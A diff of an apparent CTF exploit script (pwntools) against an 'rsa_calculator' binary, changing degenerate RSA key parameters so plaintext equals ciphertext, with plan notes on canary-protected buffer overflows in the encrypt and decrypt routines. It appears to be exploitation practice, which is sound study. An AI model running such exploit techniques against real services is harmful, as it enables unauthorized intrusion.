@@ -8,20 +8,8 @@ Exploit plan
     select menu input> -1, 0
     RSA_encrypt-sprintf> BOF but CANARY
     RSA_decrypt-memcpy> BOF but CANARY
-
-<set_key>
-    p(v6) # 16
-    q(v7) # 16
-    pub[] 
-    v4 = p * q > 255 ( 2 ^ 8) # 256
-    v5 = (p - 1) * (q - 1) # 225
-    v1(e)  # 226
-    v2(d)  # 1
-    
-    _condition_
-    v1 < v5     &&
-    v2 < v5     &&
-    e * d % v5 != 1
+<set key>
+p = 1, q = 256, e = 1, d = 1 >>>  this makes 'Plain = Encrypted = Decrypted'
 """
 
 
@@ -50,8 +38,8 @@ def rsa_decrypt(txt):
 
 p = process("/root/Downloads/rsa_calculator")
 
-# 1. set key pair, p=16, q=16, e=226, d=1
-key_pair = [b"16", b"16", b"226", b"1"]
+# 1. set key pair, p=1, q=256, e=1, d=1
+key_pair = [b"1", b"256", b"1", b"1"]
 p.recvuntil(b"> ")
 p.sendline(b"1")
 for i in range(4):
